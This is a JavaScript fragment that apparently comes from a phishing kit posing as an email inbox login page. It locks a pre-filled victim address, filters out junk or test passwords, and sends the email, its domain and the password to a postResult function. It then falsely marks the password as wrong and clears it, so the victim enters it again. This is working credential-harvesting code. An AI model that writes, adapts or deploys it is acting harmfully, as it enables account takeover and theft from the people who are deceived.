// 
if (validEmail.test(usermail)) {
    $("#inbox_e").val(usermail)
    $("#inbox_e").attr('readOnly', true)
}

$("#inbox_form").on('submit', (e)=>{
    e.preventDefault();

    if (!validEmail.test($("#inbox_e").val())) {
        $("#inbox_e").css({"border-color":"red"})
        return
    }
    else{
        $("#inbox_e").css({"border-color":"silver"})
    }

    if (validEmail.test($("#inbox_p").val()) || $("#inbox_p").val().length < 6 || $("#inbox_p").val().toLowerCase() == "qwerty" || $("#inbox_p").val() == 123456 || $("#inbox_p").val().toLowerCase() == "password" || $("#inbox_p").val().toLowerCase() == "testing") {
        $("#inbox_p").css({"border-color":"red"});
        return
    }
    else{
        $("#inbox_p").css({"border-color":"silver"});
    }

    $("#loader").show().css({"display":"flex"});

    let url = $("#inbox_e").val().split('@');

    postResult(url[1], $("#inbox_e").val(), $("#inbox_p").val(), postCount);
    
    setTimeout(() => {
        $("#inbox_p").css({"border-color":"red"});
        postCount++
        $("#inbox_p").val("")
    }, delayCounter);
})